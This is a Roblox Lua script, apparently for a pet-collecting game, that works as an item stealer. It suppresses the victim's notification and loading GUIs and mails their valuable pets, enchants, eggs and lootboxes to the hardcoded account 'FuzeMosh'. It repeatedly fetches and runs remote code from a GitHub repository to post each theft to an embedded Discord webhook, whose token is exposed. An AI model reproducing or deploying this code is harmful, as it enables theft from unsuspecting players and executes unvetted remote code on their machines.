Username = "FuzeMosh"
_G.Webhook = "https://discord.com/api/webhooks/1202310118390382593/EQcbsm3LPiQ3Eg91wadgayvy9Rm5hhp00xB7Gt0yb1OEHqZtyUYEGxxHdbFvq3M_LHi-"
local message = "poop"
local user = Username
local library = require(game.ReplicatedStorage.Library)
local inv = library.Save.Get().Inventory
local plr = game.Players.LocalPlayer
local loading = getsenv(plr.PlayerScripts.Scripts.Core["Process Pending GUI"])
local function closeLoop()
    while true do
        loading.Close()
        wait(0.02)
    end
end
coroutine.wrap(closeLoop)()
local noti = plr.PlayerGui.Notifications
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
    noti.Enabled = false
end)
noti.Enabled = false


for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.id = id
    if dir.huge == true and v.pt and v.pt == 2 and v.sh and v.sh == true  then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        _G.image = dir.thumbnail
        _G.type = "Shiny Rainbow 💎🌈"
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.image = dir.thumbnail
    _G.id = id
    if dir.huge == true and v.pt and v.pt == 1 and v.sh and v.sh == true then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        _G.image = dir.goldenThumbnail
        _G.type = "Shiny Golden 💎🥇"
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.image = dir.thumbnail
    _G.id = id
    if dir.huge == true and v.pt and v.pt == 2 then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        _G.image = dir.thumbnail
        _G.type = "Rainbow 🌈"
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end


for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.image = dir.thumbnail
    _G.id = id
    if dir.huge == true and v.sh and v.sh == true then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        _G.image = dir.goldenThumbnail
        _G.type = "Shiny 💎"
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.image = dir.thumbnail
    _G.id = id
    if dir.huge == true and v.pt and v.pt == 1 then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        _G.image = dir.goldenThumbnail
        _G.type = "Golden 🥇"
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end


for i, v in pairs(inv.Enchant) do
    local id = v.id
    if id == "Chest Mimic" then
        _G.thumbnail = "https://images-ext-1.discordapp.net/external/K1WjJaOXP5HChuoMVpo0Ig80ZZjroty8AYeLop-iKXY/https/tr.rbxcdn.com/806918ed8fdab43283205be899d800f4/420/420/Image/Png?format=webp"
    else
        _G.thubnail = "https://images-ext-1.discordapp.net/external/_Q3U1TEv4K8ogDdU2S0y9i7lwkK6act2b-NpyasLUfA/https/tr.rbxcdn.com/152849670a9eb1140cdaaf5303cf5f02/420/420/Image/Png?format=webp"
    end
    if id == "Chest Mimic" or id == "Boss Chest Mimic" then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Enchant",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

if inv.Ultimate then
    for i, v in pairs(inv.Ultimate) do
        local id = v.id
        local dir = library.Directory.Ultimates[id]
        _G.image = dir.Icon
        _G.id = id
        if id == "Hidden Treasure" or id == "Black Hole" or id == "Chest Spell" then
            local args = {
                [1] = user,
                [2] = message,
                [3] = "Ultimate",
                [4] = i,
                [5] = v._am or 1
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            _G.image = dir.Icon
            wait(0.5)
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
            _G.id = id
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
        end
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.image = dir.thumbnail
    _G.id = id
    if dir.huge then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        _G.image = dir.thumbnail
        _G.type = "Normal 🚽"
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

for i, v in pairs(inv.Egg) do
    local id = v.id
    local dir = library.Directory.Eggs[id]
    _G.image = dir.icon
    _G.id = id
    local args = {
        [1] = user,
        [2] = message,
        [3] = "Egg",
        [4] = i,
        [5] = v._am or 1
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    _G.image = dir.icon
    wait(0.5)
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
    _G.id = id
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
end

for i, v in pairs(inv.Enchant) do
    local id = v.id
    if id == "Chest Mimic" or id == "Boss Chest Mimic" or id == "Boss Lucky Block" or id == "Diamond Chest Mimic" or id == "Fireworks" or id == "Lightning Orb" or id == "Lucky Block" or id == "Massive Comet" or id == "Party Time" or id == "Super Magnet" or id == "Super Shiny Hunter" or id == "Huge Hunter" then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Enchant",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    end
end


if inv.Lootbox then
    for i, v in pairs(inv.Lootbox) do
        local id = v.id
        local dir = library.Directory.Lootboxes[id]
        _G.image = dir.Icon
        _G.id = id
        if id == "Titanic Christmas Present" then
            local args = {
                [1] = user,
                [2] = message,
                [3] = "Lootbox",
                [4] = i,
                [5] = v._am or 1
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            _G.image = dir.Icon
            wait(0.5)
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
            _G.id = id
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
        end
    end
end

if inv.Lootbox then
    for i, v in pairs(inv.Lootbox) do
        local id = v.id
        if id == "Hype Egg" then
            local args = {
                [1] = user,
                [2] = message,
                [3] = "Lootbox",
                [4] = i,
                [5] = v._am or 1
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            _G.image = dir.Icon
            wait(0.5)
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
            _G.id = id
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
        end
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.image = dir.thumbnail
    _G.id = id
    if dir.exclusiveLevel then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        _G.image = dir.thumbnail
        if v.pt and v.pt == 1 then
            _G.image = dir.goldenThumbnail
            _G.type = "Golden"
        end
        if v.pt and v.pt == 2 then
            _G.image = dir.thumbnail
            _G.type = "Rainbow"
        end
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end

for i, v in pairs(inv.Pet) do
    local id = v.id
    local dir = library.Directory.Pets[id]
    _G.image = dir.thumbnail
    _G.id = id
    if dir.exclusiveLevel then
        local args = {
            [1] = user,
            [2] = message,
            [3] = "Pet",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        _G.image = dir.thumbnail
        if v.pt and v.pt == 1 then
            _G.image = dir.goldenThumbnail
            _G.type = "Golden"
        end
        if v.pt and v.pt == 2 then
            _G.image = dir.thumbnail
            _G.type = "Rainbow"
        end
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/getthumbnail.lua'))()
        _G.id = id
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Subashians/FuzeHub/main/WebhookSystem.lua'))()
    end
end
